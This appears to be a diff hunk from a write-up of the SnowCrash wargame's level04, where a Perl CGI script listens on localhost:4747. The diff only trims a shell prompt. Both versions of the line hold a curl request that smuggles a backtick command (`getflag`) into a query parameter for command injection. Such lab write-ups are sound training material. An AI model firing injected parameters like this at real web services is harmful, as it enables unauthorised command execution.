@@ -92,7 +92,7 @@ level04.pl as CGI
 Connect on appach at localhost:4747
 
 ```sh
-level04@SnowCrash:/etc/apache2/sites-available$ curl "localhost:4747?x=\`getflag\`"
+$ curl "localhost:4747?x=\`getflag\`"
 ```
 
 <details>
